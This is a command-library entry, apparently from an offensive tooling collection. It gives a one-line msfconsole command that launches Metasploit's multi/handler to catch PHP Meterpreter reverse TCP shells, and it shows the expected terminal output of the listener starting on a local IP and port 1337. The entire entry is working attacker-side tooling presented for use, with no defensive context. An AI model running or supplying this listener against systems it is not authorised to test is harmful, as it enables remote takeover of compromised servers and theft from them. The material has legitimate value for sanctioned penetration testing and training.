---
id: f72fba80-39cf-427e-8410-2a336c82a3a9
name: msfconsole Meterpreter PHP script listener
type: command
executor: null
data: msfconsole -q -x "use exploit/multi/handler;set PAYLOAD php/meterpreter/reverse_tcp;
  set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
output: 'root@hackers:~/Content/payloads# msfconsole -q -x "use exploit/multi/handler;set
  PAYLOAD php/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337; run;exit
  -y"

  [-] ***

  [-] * WARNING: No database support: No database YAML file

  [-] ***

  PAYLOAD => php/meterpreter/reverse_tcp

  LHOST => 172.16.162.187

  LPORT => 1337

  [*] Started reverse TCP handler on 172.16.162.187:1337'
created_at: '2019-09-17T17:31:17.995234+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfconsole Meterpreter PHP script listener

```bash
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $LOCAL_IP; set LPORT $LOCAL_PORT; run;exit -y"
```

## Expected Output

```
root@hackers:~/Content/payloads# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
PAYLOAD => php/meterpreter/reverse_tcp
LHOST => 172.16.162.187
LPORT => 1337
[*] Started reverse TCP handler on 172.16.162.187:1337
```


